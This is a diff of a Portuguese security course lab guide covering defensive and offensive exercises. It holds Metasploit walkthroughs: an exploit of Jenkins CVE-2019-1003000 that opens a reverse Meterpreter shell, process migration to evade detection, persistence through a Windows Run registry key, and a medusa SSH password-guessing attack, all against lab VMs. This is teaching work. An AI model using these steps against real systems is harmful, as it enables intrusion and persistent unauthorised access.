+ 772   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 820   564   svchost.exe  x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 964   564   svchost.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+
+(...)</pre>
 </div>
 </div>
 <div class="literalblock">
 <div class="content">
-<pre>meterpreter &gt; migrate 796
-[*] Migrating from 1932 to 796...
+<pre>meterpreter &gt; migrate 676
+[*] Migrating from 3180 to 676...
 [*] Migration completed successfully.</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que, após a migração, o processo <code>virus.exe</code> é encerrado&#8201;&#8212;&#8201;dificultando a detecção da invasão.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; ps virus
+Filtering on 'virus'
+No matching processes were found.</pre>
 </div>
 </div>
 </li>
@@ -2867,15 +3016,18 @@ Process List
 <div class="literalblock">
 <div class="content">
 <pre>meterpreter &gt; run persistence -X
-[*] Running Persistance Script
-[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20180818.3516/WINSERVER-A_20180818.3516.rc
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
+[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
+[*] Running Persistence Script
+[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20190410.4100/WINSERVER-A_20190410.4100.rc
 [*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
-[*] Persistent agent script is 148489 bytes long
-[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
-[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
-[+] Agent executed with PID 2576
-[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
-[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO</pre>
+[*] Persistent agent script is 99638 bytes long
+[+] Persistent Script written to C:\Windows\TEMP\JRUGwDg.vbs
+[*] Executing script C:\Windows\TEMP\JRUGwDg.vbs
+[+] Agent executed with PID 556
+[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf
+[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\cWDaWtSsDjaFWrf</pre>
 </div>
 </div>
 </li>
@@ -2885,20 +3037,210 @@ Process List
 <div class="content">
 <img src="./img/meterpreter-commands-p1.png" alt="meterpreter commands p1">
 </div>
-<div class="title">Figure 41. Comandos do meterpreter, parte 1</div>
+<div class="title">Figure 42. Comandos do meterpreter, parte 1</div>
 </div>
 <div id="img-meterpreter-commands-p2" class="imageblock" style="text-align: center">
 <div class="content">
 <img src="./img/meterpreter-commands-p2.png" alt="meterpreter commands p2">
 </div>
-<div class="title">Figure 42. Comandos do meterpreter, parte 2</div>
+<div class="title">Figure 43. Comandos do meterpreter, parte 2</div>
 </div>
 </li>
 </ol>
 </div>
 </div>
 <div class="sect2">
-<h3 id="_7_realizando_um_ataque_de_dicionário_com_o_medusa">7) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></h3>
+<h3 id="_7_realizando_um_ataque_com_o_metasploit_em_ambiente_linux">7) Realizando um ataque com o Metasploit em ambiente Linux</h3>
+<div class="admonitionblock warning">
+<table>
+<tr>
+<td class="icon">
+<i class="fa icon-warning" title="Warning"></i>
+</td>
+<td class="content">
+<div class="paragraph">
+<p>Esta atividade será realizada nas máquinas virtuais <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
+</div>
+</td>
+</tr>
+</table>
+</div>
+<div class="paragraph">
+<p>Nessa atividade utilizaremos novamente o <code>metasploit</code> disponível na máquina <em>KaliLinux-G</em>, desta vez focando em explorar uma vulnerabilidade em ambiente Linux.</p>
+</div>
+<div class="paragraph">
+<p>Iremos atacar a ferramenta Jenkins, uma das ferramentas de integração contínua <em>open source</em> mais populares. Em 8 de janeiro de 2019 foram publicados três CVEs (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003000">CVE-2019-1003000</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003001">CVE-2019-1003001</a> e <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003002">CVE-2019-1003002</a>) para o Jenkins versão &#8656; 2.137 e um de seus <em>plugins</em>, o <em>Pipeline Groovy</em> versão 2.61, que detalhavam um vulnerabilidade no roteamento dinâmico do Jenkins permitindo o <em>bypass</em> de permisões de acesso e leitura do servidor para realizar o download e execução de um JAR (<em>Java Archive</em>) malicioso.</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Primeiro, vamos iniciar o serviço Jenkins vulnerável&#8201;&#8212;&#8201;ele está disponível em um container Docker pré-configurado em sua máquina <em>LinServer-G</em>. Acesse a máquina <em>LinServer-G</em> como <code>root</code> e entre no diretório <code>/root/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/</code>:</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+LinServer-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># whoami
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cd ~/src/cve-2019-1003000-jenkins-rce-poc/sample-vuln/</pre>
+</div>
+</div>
+</li>
+<li>
+<p>Nesse diretório, execute o <em>script</em> <code>run.sh</code>.</p>
+<div class="literalblock">
+<div class="content">
+<pre># ./run.sh
+5900d5e6faa03a440f7c13e14cc360bdd1fead69815413efaebca23787b73c09</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Após alguns segundos, use o comando <code>docker container list</code> para verificar que o container foi iniciado com sucesso:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># docker container list
+CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                                              NAMES
+5900d5e6faa0        jenkins/jenkins:2.137-alpine   "/sbin/tini -- /usr/…"   About a minute ago   Up About a minute   0.0.0.0:8080-&gt;8080/tcp, 0.0.0.0:50000-&gt;50000/tcp   vuln-jenkins</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Use o comando <code>docker logs &lt;CONTAINER_ID&gt;</code> para verificar que o Jenkins foi iniciado com sucesso:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># docker logs 5900d5e6faa0
+
+(...)
+
+INFO: Completed initialization
+Apr 10, 2019 3:29:34 AM hudson.WebAppMain$3 run
+INFO: Jenkins is fully up and running</pre>
+</div>
+</div>
+</li>
+<li>
+<p>Agora, acesse a VM <em>KaliLinux-G</em> como <code>root</code> e inicie o <code>msfconsole</code>:</p>
+<div class="literalblock">
+<div class="content">
+<pre># hostname
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># whoami
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># msfconsole
+
+(...)
+
+msf5 &gt;</pre>
+</div>
+</div>
+</li>
+<li>
+<p>Iremos usar o <em>exploit</em> <code>exploit/multi/http/jenkins_metaprogramming</code>. Indique sua utilização:</p>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 &gt; use exploit/multi/http/jenkins_metaprogramming</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Defina o <em>host</em>-alvo do ataque, a máquina <em>LinServer-G</em>&#8201;&#8212;&#8201;caso você esteja no grupo B, altere o endereço IP abaixo de forma apropriada:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/http/jenkins_metaprogramming) &gt; set rhost 172.16.1.10
+rhost =&gt; 172.16.1.10</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Defina o endereço do <em>host</em> local&#8201;&#8212;&#8201;novamente, atenção caso você seja membro do grupo B:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/http/jenkins_metaprogramming) &gt; set lhost 172.16.1.30
+lhost =&gt; 172.16.1.30</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Tudo pronto! Execute o <em>exploit</em> com o comando <code>run</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>msf5 exploit(multi/http/jenkins_metaprogramming) &gt; run
+
+[*] Started HTTPS reverse handler on https://172.16.1.30:8443
+[*] Using URL: http://0.0.0.0:8080/
+[*] Local IP: http://172.16.1.30:8080/
+[*] Sending Jenkins and Groovy go-go-gadgets
+[*] https://172.16.1.30:8443 handling request from 172.16.1.10; (UUID: dcxkuugy) Staging java payload (54377 bytes) ...
+[*] Meterpreter session 1 opened (172.16.1.30:8443 -&gt; 172.16.1.10:37828) at 2019-04-10 00:38:42 -0300
+[*] Server stopped.
+[!] This exploit may require manual cleanup of '$HOME/.groovy/grapes/JacobsonLLC' on the target
+
+meterpreter &gt;</pre>
+</div>
+</div>
+</li>
+<li>
+<p>Estamos dentro do sistema! Verifique com qual usuário estamos conectados:</p>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; getuid
+Server username: jenkins</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>O comando <code>sysinfo</code> pode ser usado para obter mais informações sobre o sistema atacado:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; sysinfo
+Computer    : 5900d5e6faa0
+OS          : Linux 4.9.0-8-amd64 (amd64)
+Meterpreter : java/linux</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note que, como estamos executando o Jenkins dentro de um container, o isolamento provido por esse tipo de solução impede que tenhamos acesso irrestrito ao sistema hospedeiro. Veja que a lista de processos reportada pelo comando <code>ps</code> é bastante reduzida:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>meterpreter &gt; shell
+Process 1 created.
+Channel 1 created.</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>ps auxmw
+PID   USER     TIME  COMMAND
+    1 jenkins   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
+    6 jenkins   0:20 java -Duser.home=/var/jenkins_home -jar /usr/share/jenkins/jenkins.war
+   90 jenkins   0:04 /usr/lib/jvm/java-1.8-openjdk/jre/bin/java -classpath /tmp/~spawn7661342154187960868.tmp.dir metasploit.Payload
+  442 jenkins   0:00 /bin/sh
+  450 jenkins   0:00 ps auxmw</pre>
+</div>
+</div>
+</li>
+</ol>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_8_realizando_um_ataque_de_dicionário_com_o_medusa">8) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></h3>
 <div class="admonitionblock warning">
 <table>
 <tr>
@@ -2920,12 +3262,22 @@ Process List
 <div class="literalblock">
 <div class="content">
 <pre># hostname
-FWGW1-A
-
-# useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
-# useradd -m marco ; echo 'marco:abacate' | chpasswd
-
-# tail -f -n0 /var/log/auth.log</pre>
+FWGW1-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># useradd -m marcelo ; echo 'marcelo:123456' | chpasswd</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># useradd -m marco ; echo 'marco:abacate' | chpasswd</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># tail -f -n0 /var/log/auth.log</pre>
 </div>
 </div>
 </li>
@@ -2934,10 +3286,13 @@ FWGW1-A
 <div class="literalblock">
 <div class="content">
 <pre># hostname
-KaliLinux-A
-
-# nc 172.16.1.1 22
-SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1</pre>
+KaliLinux-A</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nc 172.16.1.1 22
+SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6</pre>
 </div>
 </div>
 </li>
@@ -2946,15 +3301,21 @@ SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1</pre>
 <div class="literalblock">
 <div class="content">
 <pre># pwd
-/root
-
-# cat users.txt
+/root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cat users.txt
 root
 marcelo
 marco
-silva
-
-# cat passwords.txt
+silva</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cat passwords.txt
 rnpesr
 123456
 abacate
@@ -2966,7 +3327,7 @@ framboesa</pre>
 <p>Finalmente, use o comando <code>medusa</code> para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o <em>banner</em> de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).</p>
 <div class="literalblock">
 <div class="content">
-<pre># medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
+<pre># medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u6 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
 ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
 ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]</pre>
 </div>
@@ -3667,7 +4028,7 @@ FWGW1-A</pre>
 <div class="content">
 <img src="./img/firewall-fwd-iis-ok.png" alt="firewall fwd iis ok">
 </div>
-<div class="title">Figure 43. Acesso da Intranet para a DMZ</div>
+<div class="title">Figure 44. Acesso da Intranet para a DMZ</div>
 </div>
 </li>
 </ol>
@@ -3975,7 +4336,7 @@ FWGW1-A</pre>
 <div class="content">
 <img src="./img/firewall-dnat-linserver.png" alt="firewall dnat linserver">
 </div>
-<div class="title">Figure 44. Teste DNAT do acesso Internet &gt; LinServer</div>
+<div class="title">Figure 45. Teste DNAT do acesso Internet &gt; LinServer</div>
 </div>
 <div class="paragraph">
 <p>Voltando ao monitoramento do log de acessos do Apache na máquina <em>LinServer-G</em>, vemos que o acesso de fato se concretizou:</p>
@@ -4010,7 +4371,7 @@ LinServer-A
 <div class="content">
 <img src="./img/firewall-dnat-winserver.png" alt="firewall dnat winserver">
 </div>
-<div class="title">Figure 45. Teste DNAT do acesso Internet &gt; WinServer</div>
+<div class="title">Figure 46. Teste DNAT do acesso Internet &gt; WinServer</div>
 </div>
 </li>
 </ol>
@@ -4266,7 +4627,7 @@ Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
 <div class="content">
 <img src="./img/syslog-gpedit.png" alt="syslog gpedit">
 </div>
-<div class="title">Figure 46. Tela de políticas de auditoria para o WinServer-G</div>
+<div class="title">Figure 47. Tela de políticas de auditoria para o WinServer-G</div>
 </div>
 </li>
 <li>
@@ -4308,7 +4669,7 @@ Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
 <div class="content">
 <img src="./img/syslog-snare-start.png" alt="syslog snare start">
 </div>
-<div class="title">Figure 47. Inicialização do Snare</div>
+<div class="title">Figure 48. Inicialização do Snare</div>
 </div>
 <div class="paragraph">
 <p>Irá ser lançada uma janela do navegador. Informe o usuário <code>snare</code>, e senha <code>rnpesr</code>, como se segue:</p>
@@ -4317,7 +4678,7 @@ Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
 <div class="content">
 <img src="./img/syslog-snare-password.png" alt="syslog snare password">
 </div>
-<div class="title">Figure 48. Login no Snare</div>
+<div class="title">Figure 49. Login no Snare</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Network Configuration</em>&#8201;&#8212;&#8201;informe o IP da máquina <em>LinServer-G</em> no campo <em>Destination Snare Server address</em>, e a porta 514 no campo <em>Destination Port</em>, como se segue. Em seguida, clique em <em>Change Configuration</em>.</p>
@@ -4326,7 +4687,7 @@ Aug 26 06:49:30 172.16.1.1 aluno: Teste</pre>
 <div class="content">
 <img src="./img/syslog-snare-config.png" alt="syslog snare config">
 </div>
-<div class="title">Figure 49. Configurações do Snare</div>
+<div class="title">Figure 50. Configurações do Snare</div>
 </div>
 <div class="paragraph">
 <p>Em seguida, clique em <em>Apply the Latest Audit Configuration</em> e depois em <em>Reload Settings</em>.</p>
@@ -4502,7 +4863,7 @@ qui out 11 15:28:12 -03 2018</pre>
 <div class="content">
 <img src="./img/ntp-win-internettime.png" alt="ntp win internettime">
 </div>
-<div class="title">Figure 50. Aba Internet Time do relógio do Windows</div>
+<div class="title">Figure 51. Aba Internet Time do relógio do Windows</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Change Settings&#8230;&#8203;</em>, e informe o IP da máquina <em>LinServer-G</em> no campo <em>Server</em>. Em seguida, clique em <em>Update now</em> (se ocorrer um erro, clique uma segunda vez), e o relógio do sistema deverá ser atualizado.</p>
@@ -4511,7 +4872,7 @@ qui out 11 15:28:12 -03 2018</pre>
 <div class="content">
 <img src="./img/ntp-win-setserver.png" alt="ntp win setserver">
 </div>
-<div class="title">Figure 51. Modificando o servidor NTP do Windows</div>
+<div class="title">Figure 52. Modificando o servidor NTP do Windows</div>
 </div>
 </li>
 </ol>
@@ -4573,7 +4934,7 @@ LinServer-A</pre>
 <div class="content">
 <img src="./img/cacti-console.png" alt="cacti console">
 </div>
-<div class="title">Figure 52. Console do Cacti</div>
+<div class="title">Figure 53. Console do Cacti</div>
 </div>
 </li>
 <li>
@@ -4636,7 +4997,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/snmp-wininstall.png" alt="snmp wininstall">
 </div>
-<div class="title">Figure 53. Instalação da feature SNMP</div>
+<div class="title">Figure 54. Instalação da feature SNMP</div>
 </div>
 </li>
 <li>
@@ -4645,7 +5006,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/snmp-winprop.png" alt="snmp winprop">
 </div>
-<div class="title">Figure 54. Propriedades do serviço SNMP</div>
+<div class="title">Figure 55. Propriedades do serviço SNMP</div>
 </div>
 <div class="paragraph">
 <p>Na aba <em>Security</em>, caixa <em>Accepted community names</em>, clique em <em>Add&#8230;&#8203;</em> e adicione a comunidade <code>public</code> com permissões <em>READ ONLY</em>. Logo abaixo, na caixa <em>Accept SNMP packets from these hosts</em>, clique em <em>Add&#8230;&#8203;</em> e adicione o IP da máquina <em>LinServer-G</em>. Sua janela deverá ficar assim:</p>
@@ -4654,7 +5015,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/snmp-winconfig.png" alt="snmp winconfig">
 </div>
-<div class="title">Figure 55. Configurações do serviço SNMP</div>
+<div class="title">Figure 56. Configurações do serviço SNMP</div>
 </div>
 <div class="paragraph">
 <p>Finalmente, clique com o botão direito no serviço <em>SNMP Service</em> e em seguida em <em>Restart</em>.</p>
@@ -4666,7 +5027,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-adddevice.png" alt="cacti adddevice">
 </div>
-<div class="title">Figure 56. Adicionando device no Cacti, parte 1</div>
+<div class="title">Figure 57. Adicionando device no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, informe o nome da máquina <em>FWGW1-G</em> no campo <em>Description</em>, seu IP exposto à DMZ no campo <em>Hostname</em>, e escolha a opção <em>Local Linux Machine</em> no campo <em>Host Template</em>. Verifique se sua janela está como se segue, e clique em <em>Create</em>.</p>
@@ -4675,7 +5036,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-adddevice2.png" alt="cacti adddevice2">
 </div>
-<div class="title">Figure 57. Adicionando device no Cacti, parte 2</div>
+<div class="title">Figure 58. Adicionando device no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Verifique que as informações SNMP do <em>host</em> <em>FWGW1-G</em> figuram corretamente na seção <em>SNMP Information</em> no topo da tela. Em seguida, clique em <em>Create Graphs for this Host</em>.</p>
@@ -4684,7 +5045,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-cgraphs.png" alt="cacti cgraphs">
 </div>
-<div class="title">Figure 58. Adicionando gráficos no Cacti, parte 1</div>
+<div class="title">Figure 59. Adicionando gráficos no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, selecione todos os <em>Graph Templates</em> e <em>Data Queries</em> disponíveis e clique em <em>Create</em>. Na janela que se segue, clique novamente em <em>Create</em>.</p>
@@ -4693,7 +5054,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-cgraphs2.png" alt="cacti cgraphs2">
 </div>
-<div class="title">Figure 59. Adicionando gráficos no Cacti, parte 2</div>
+<div class="title">Figure 60. Adicionando gráficos no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Agora, o passo final é adicionar os gráficos a uma árvore de gráficos. No menu à esquerda, clique em <em>Graph Trees</em>, e em seguida em <em>Default Tree</em>.</p>
@@ -4702,7 +5063,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-addtree.png" alt="cacti addtree">
 </div>
-<div class="title">Figure 60. Adicionando gráficos a árvores no Cacti, parte 1</div>
+<div class="title">Figure 61. Adicionando gráficos a árvores no Cacti, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, em <em>Tree Items</em>, clique em <em>Add</em>.</p>
@@ -4711,7 +5072,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-addtree2.png" alt="cacti addtree2">
 </div>
-<div class="title">Figure 61. Adicionando gráficos a árvores no Cacti, parte 2</div>
+<div class="title">Figure 62. Adicionando gráficos a árvores no Cacti, parte 2</div>
 </div>
 <div class="paragraph">
 <p>Na nova janela, em <em>Tree Item Type</em>, altere o valor para <em>Host</em>. Novas opções irão surgir. Em <em>Host</em>, selecione a máquina <em>FWGW1-G</em>, e depois clique em <em>Create</em>.</p>
@@ -4720,7 +5081,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-addtree3.png" alt="cacti addtree3">
 </div>
-<div class="title">Figure 62. Adicionando gráficos a árvores no Cacti, parte 3</div>
+<div class="title">Figure 63. Adicionando gráficos a árvores no Cacti, parte 3</div>
 </div>
 <div class="paragraph">
 <p>Para visualizar os gráficos recém-criados, no menu superior acesse <em>graphs</em>, expanda a <em>Default Tree</em> e clique no <em>host</em> <em>FWGW1-G</em>. Pode demorar algum tempo para que os gráficos sejam populados.</p>
@@ -4729,7 +5090,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-viewgraph.png" alt="cacti viewgraph">
 </div>
-<div class="title">Figure 63. Visualizando gráficos no Cacti, máquina <em>FWGW1-G</em></div>
+<div class="title">Figure 64. Visualizando gráficos no Cacti, máquina <em>FWGW1-G</em></div>
 </div>
 </li>
 <li>
@@ -4738,7 +5099,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 <div class="content">
 <img src="./img/cacti-viewgraph2.png" alt="cacti viewgraph2">
 </div>
-<div class="title">Figure 64. Visualizando gráficos no Cacti, máquina <em>WinServer-G</em></div>
+<div class="title">Figure 65. Visualizando gráficos no Cacti, máquina <em>WinServer-G</em></div>
 </div>
 </li>
 </ol>
@@ -5630,7 +5991,7 @@ out 15 16:25:53 FWGW1-A barnyard2[3739]: Waiting for new data</pre>
 <div class="content">
 <img src="./img/snorby1.png" alt="snorby1">
 </div>
-<div class="title">Figure 65. Dashboard do Snorby</div>
+<div class="title">Figure 66. Dashboard do Snorby</div>
 </div>
 </li>
 </ol>
@@ -5711,7 +6072,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/snorby2.png" alt="snorby2">
 </div>
-<div class="title">Figure 66. Listagem de eventos no Snorby</div>
+<div class="title">Figure 67. Listagem de eventos no Snorby</div>
 </div>
 </li>
 <li>
@@ -5720,7 +6081,7 @@ iface eth0 inet dhcp</pre>
 <div class="content">
 <img src="./img/snorby3.png" alt="snorby3">
 </div>
-<div class="title">Figure 67. Listagem de eventos no Snorby</div>
+<div class="title">Figure 68. Listagem de eventos no Snorby</div>
 </div>
 </li>
 <li>
@@ -6459,7 +6820,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/thunderbird-addaccount.png" alt="thunderbird addaccount">
 </div>
-<div class="title">Figure 68. Adicionando uma conta de e-mail ao Thunderbird</div>
+<div class="title">Figure 69. Adicionando uma conta de e-mail ao Thunderbird</div>
 </div>
 <div class="paragraph">
 <p>Durante o processo de criação de conta, o <em>Thunderbird</em> irá abrir uma janela para autenticação no GMail, solicitando autorização para integração. Digite a senha da conta definida no passo (1) e garanta as permissões solicitadas.</p>
@@ -6497,7 +6858,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/thunderbird-pep1.png" alt="thunderbird pep1">
 </div>
-<div class="title">Figure 69. PeP habilitado no Thunderbird</div>
+<div class="title">Figure 70. PeP habilitado no Thunderbird</div>
 </div>
 <div class="paragraph">
 <p>Logo abaixo, você visualizará o estado da privacidade como "Inseguro". Isso se deve ao fato de que você e seu colega ainda não fizeram a troca de chaves. O <em>Enigmail/PeP</em> irá se encarregar de anexar sua chave pública automaticamente à mensagem. Envie o email.</p>
@@ -6509,7 +6870,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/thunderbird-pep2.png" alt="thunderbird pep2">
 </div>
-<div class="title">Figure 70. Mensagem segura, não confiável</div>
+<div class="title">Figure 71. Mensagem segura, não confiável</div>
 </div>
 </li>
 <li>
@@ -6518,7 +6879,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/thunderbird-pep3.png" alt="thunderbird pep3">
 </div>
-<div class="title">Figure 71. Verificação de palavras confiáveis</div>
+<div class="title">Figure 72. Verificação de palavras confiáveis</div>
 </div>
 <div class="paragraph">
 <p>Serão mostradas cinco palavras confiáveis, que devem ser confirmadas com o seu colega. Se corretas, significa que a chave pública anexada à mensagem original é, de fato, correspondente à chave privada sob posso do seu colega. Clique no botão <em>Confirme palavras-confiáveis</em> para autenticar a chave.</p>
@@ -6530,7 +6891,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/thunderbird-pep4.png" alt="thunderbird pep4">
 </div>
-<div class="title">Figure 72. Mensagem segura e confiável</div>
+<div class="title">Figure 73. Mensagem segura e confiável</div>
 </div>
 <div class="paragraph">
 <p>A partir desse momento, a chave pública do seu colega é conhecida pelo <em>Enigmail/PeP</em>, e é possível enviar mensagens criptografadas para ele e verificar mensagens assinadas. Envie um email-resposta para a mensagem original, e repita os passos (8) e (9) para autenticar a chave no sentido oposto. A partir desse momento, será possível trocar mensagens seguras entre as duas partes.</p>
@@ -6566,7 +6927,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/veracrypt1.png" alt="veracrypt1">
 </div>
-<div class="title">Figure 73. Criação de volumes no VeraCrypt, parte 1</div>
+<div class="title">Figure 74. Criação de volumes no VeraCrypt, parte 1</div>
 </div>
 </li>
 <li>
@@ -6575,7 +6936,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/veracrypt2.png" alt="veracrypt2">
 </div>
-<div class="title">Figure 74. Criação de volumes no VeraCrypt, parte 2</div>
+<div class="title">Figure 75. Criação de volumes no VeraCrypt, parte 2</div>
 </div>
 </li>
 <li>
@@ -6587,7 +6948,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/veracrypt3.png" alt="veracrypt3">
 </div>
-<div class="title">Figure 75. Criação de volumes no VeraCrypt, parte 3</div>
+<div class="title">Figure 76. Criação de volumes no VeraCrypt, parte 3</div>
 </div>
 </li>
 <li>
@@ -6608,7 +6969,7 @@ teste assinatura e criptografia assimetrica</pre>
 <div class="content">
 <img src="./img/veracrypt4.png" alt="veracrypt4">
 </div>
-<div class="title">Figure 76. Criação de volumes no VeraCrypt, parte 4</div>
+<div class="title">Figure 77. Criação de volumes no VeraCrypt, parte 4</div>
 </div>
 </li>
 <li>
@@ -6951,7 +7312,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-dlcert.png" alt="mitmproxy dlcert">
 </div>
-<div class="title">Figure 77. Download do certificado do mitmproxy</div>
+<div class="title">Figure 78. Download do certificado do mitmproxy</div>
 </div>
 </li>
 <li>
@@ -6960,7 +7321,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-instcert1.png" alt="mitmproxy instcert1">
 </div>
-<div class="title">Figure 78. Instalação do certificado do mitmproxy, parte 1</div>
+<div class="title">Figure 79. Instalação do certificado do mitmproxy, parte 1</div>
 </div>
 <div class="paragraph">
 <p>Clique em <em>Avançar</em>. Em seguida, marque a caixa <em>Colocar todos os certificados no repositório a seguir</em>, clique em <em>Procurar&#8230;&#8203;</em> e selecione <em>Autoridades de Certificação Raiz Confiáveis</em>.</p>
@@ -6969,7 +7330,7 @@ rtt min/avg/max/mdev = 0.451/0.451/0.451/0.000 ms</pre>
 <div class="content">
 <img src="./img/mitmproxy-instcert2.png" alt="mitmproxy instcert2">
 </div>
-<div class="title">Figure 79. Instalação do certificado do mitmproxy, parte 2</div>
+<div class="title">Figure 80. Instalação do certificado do mitmproxy, parte 2</div>
 </div>
 <div class="paragraph">
